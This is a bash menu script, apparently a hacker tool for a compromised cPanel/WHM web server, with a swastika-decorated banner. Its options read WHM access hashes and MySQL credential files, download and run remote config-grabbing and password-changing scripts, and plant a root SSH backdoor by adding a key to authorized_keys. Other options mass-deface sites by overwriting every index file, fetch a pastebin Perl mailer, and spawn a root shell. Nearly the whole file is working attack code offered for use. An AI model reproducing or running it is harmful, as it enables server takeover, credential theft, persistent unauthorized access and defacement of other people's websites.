clear
echo ""
echo -e "\e[93m---------------------------------------"
echo ""
echo -e "\e[91m  卐 By InjectorDaher && Just Wolf 卐 "
echo ""
echo -e "\e[34m              ☠   V.2    ☠         "
echo ""
echo -e "\e[93m---------------------------------------"
echo ""
echo "Wait ..."
sleep 3
clear
	echo "

			     ▄█████      ██████
			         ▀██    ██▀▐
			      ▄█████    ██████
			     ▀▀▀▀▀▐ █  █ ▀▀▀▀▀
			           ▄█  ██
			     ███▀▀  █▄▐█▄ ▀▀███▀
			      ██▀█████████████▀
			       █▐   ▀▀▀▀    █
			             ██    ▐
			             ██
			    
		    "

echo -e  "	  	 \e[92m ☠ ----------------------------------------- ☠ "
echo ""
echo -e "		\e[97m [❶ ] ☠ Get root Server ☠ "
echo -e "		\e[31m [❷ ] ☠ Hacked WHM and acchash ☠ "
echo -e "		\e[91m [❸ ] ☠ sites will change password Cpanel and FTB ☠"
echo -e "		\e[34m [❹ ] ☠ Get All Config site and jump server ☠"
echo -e "		\e[92m [❺ ] ☠ Install Back Door on ssh root Fuck admin ☠"
echo -e "		\e[96m [❻ ] ☠ Mass sever index or shell ☠"
echo -e "		\e[97m [❼ ] ☠ test send server ☠"
echo -e "		\e[91m [❾❾ ]         ☠ Exit  ☠ "
echo ""
echo -e  " 	 	 \e[92m ☠ ----------------------------------------- ☠"
echo -e "\e[91m"
echo ""
read -p "Enter your Numper  $  " name

if [ $name == "1" ]; then
echo -e "\e[93m";
read -p "# Enter New Password root #  $ : " root
echo -e "\e[97m"
echo " Pleass Wait ..."
sleep 3
echo ""
uname -a
sleep 10
echo ""
echo "  Ok Done !! .. "
echo -e "\e[92m"
echo " $  Password root $ : " $root
echo -e "\e[91m"
echo ""
echo "Enjoy ^_^ ";
python -c "import pty; pty.spawn('/bin/bash')"
fi


if [ $name == "2" ]; then
echo -e "\e[32m"
cat /root/.accesshash
cat /root/.my.cnf
echo "Enjoy ^_^ ";
fi

if [ $name == "4" ]; then
echo -e "\e[32"
wget https://raw.githubusercontent.com/mhmadmasrwe/w0lgix-tool/master/config-grabber.sh -O config.sh
chmod 755 config.sh
bash config.sh
echo -e "\e[33m"
echo "Go to dir config-sniper";
echo " if you need Jump Enter  > cat open-dir.txt"
zip -r backupconfig.zip config-sniper/
echo "Enjoy ^_^ ";
fi

if [ $name == "3" ]; then
echo -e "\e[32m"
wget http://www.linux-op.com/downloads/password_changer.tar.gz
tar -xzf password_changer.tar.gz
cd password_changer
python install_WHM_plugin.py
clear
echo -e "\e[31"
echo "Pleass Enter Numper 1 "
echo -e "\e[32m"
python pass_changer.py
echo "Enjoy ^_^ ";

fi


if [ $name == "5" ]; then
clear
echo -e "\e[33m"
mkdir /root/root
cd /root/root
echo -e "\e[32m"
echo " Enter here { Generating public/private rsa key pair.} this > Pleass Copy and Enter : # /root/root/id_rsa # "
echo " Pleass Enter Here { passphrase (empty for no passphrase): } this > # yourpassword #  "
echo -e "\e[33m"
ssh-keygen -t rsa -b 2048
ls -lh /root/root/
cat  /root/root/id_rsa.pub >> /root/.ssh/authorized_keys
clear
echo -e "\e[97m"
cat /root/root/id_rsa
echo "Now install puttygen.exe and save this hash";
echo "Watch This Video Link : ";
echo "Enjoy ^_^ ";
fi



if [ $name == "7" ]; then
echo -e "\e[31"
wget https://pastebin.com/raw/XN4NphGq -O a.pl
echo justtest > lit.html
wget https://hastebin.com/raw/uvukecoxov -O testmail.txt
perl a.pl  testmail.txt "Support@support.help"  "test server" lit.html
echo 'Done !!';
fi


if [ $name == "6" ]; then
echo -e "\e[31"
echo '################ injectoDaher ###########################'

echo '[+] your index path on the server'
read index 
echo
echo '[+] enter the path To deface '
read path
echo
echo '[+] Starting ........'
find $path -name "index.*" -exec cp $index {} \;
echo 
echo '[+] Enjoy ^_^'

fi